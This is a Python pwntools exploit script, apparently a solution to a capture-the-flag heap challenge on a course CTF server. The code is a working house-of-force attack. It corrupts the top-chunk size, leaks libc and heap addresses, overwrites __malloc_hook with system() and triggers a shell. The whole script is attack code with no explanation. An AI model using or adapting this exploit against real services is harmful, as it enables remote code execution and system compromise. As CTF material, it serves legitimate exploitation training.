from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('csie.ctf.tw',10141)
else:
    r = remote('localhost',8888)
#r.interactive()
def allocate(size,data):
    r.sendline('1')
    r.recvuntil('Size :')
    r.send(str(size))
    r.recvuntil('Data :')
    r.send(data)
def show():
    r.sendline('2')
    r.recvuntil(':')
def str2addr(s):
    addr = s.strip().ljust(8,'\0')
    return u64(addr)

#default page size = 0x21000
heap = 0x602050             #the addr of heap variable   

#leak the first memory size, then fill it to get the tail of top chunk
def get_topchunk_info():
    allocate(0x18,'a' * 0x18)
    show()
    r.recvuntil('a' * 0x18)
    topchunk_size = str2addr( r.recvline() ) + 0x20 - 1
    print('page size : %s' % hex(topchunk_size) )
    return topchunk_size

topchunk_size = get_topchunk_info()
def fake_top_header():
    prev_size = 0
    size = 0xdeafbeef #0x140
    fd = heap - 0x18
    bk = heap - 0x10
    fake_chunk = flat([prev_size, size, fd, bk])

    return fake_chunk
#house of force, shift down the top chunk

#overflow top chunk with size 0xffffff

    
allocate(0x1000 - 0x30,fake_top_header() )
allocate(0x18,'x'*0x18 + p64(0xffffffffffffffff))
#nb = new_top - old_top - 16 = -0x100
#move top chunk to begining of heap
allocate(-0x1030,p64(0xdeadbeef) )
allocate(0x18,'b' * 0x10 + p64(0) + p64(0x1001-0x20) )

#now the heap has a chunk in unsorted bin, leak the info about libc.so.6
allocate(0x2710,p64(0xdeadbeef) )
allocate(0xf90,'a' * 8 )


#leak info
show()
r.recvuntil('a'*8)
unsorted_bin = str2addr( r.recvline() )
print('unsorted bin addr : %s' % hex(unsorted_bin))

#offset = 0x1188
libc_rw = unsorted_bin - 0x1188
libc_base = libc_rw - 0x3c4000
print('libc base : %s' % hex(libc_base) )
print('libc rw   : %s' % hex(libc_rw) )
#free another chunk to leak heap info
allocate(0x68,'x'*0x68 + p64(0xffffffffffffffff))
nb = -0x23750
#back to begining of heap
allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin
allocate(0x28,'b' * 0x20 + p64(0) + p64(0x1001-0x80) )


#back again
allocate(0x2710,p64(0xdeadbeef) )
allocate(0xf30,'a' * 8 )
allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
nb = -0x46770
allocate(nb,'x'*8)#malloc a large bin size chunk, the unsorted bin chunk has been move to small bin

#leak the heap info
allocate(0x90,'y' * 0x90 )
show()
r.recvuntil('y'*0x90)
heap_info = u64( r.recvline().strip().ljust(8,'\0') )
heap_base = heap_info - 0x80
print('heap base : %s' % hex(heap_base) )

#now back to begining of heap
allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
nb = -0xf0
allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin

def move_top_to_addr(old_addr, new_addr):
    allocate(0x38,'b' * 0x30 + p64(0) + p64(0xffffffffffffffff) )
    print('move top chunk to %s' % hex(new_addr))
    nb = new_addr - (old_addr + 0x40) - 16
    allocate(nb,'x'*8)#malloc a large bin size chunk, the unsoted bin chunk has been move to small bin



#malloc_hook 
__malloc_hook = libc_rw + 0xb10


move_top_to_addr(heap_base, __malloc_hook - 0x10)
bin_sh_addr = libc_base + 0x18cd17
gets = libc_base + 0x6ed80
system = libc_base + 0x45390
data = flat([system])
allocate(0x20, data)

r.send('1')
r.recvuntil(':')
r.send(str(bin_sh_addr))
print('')
r.interactive()
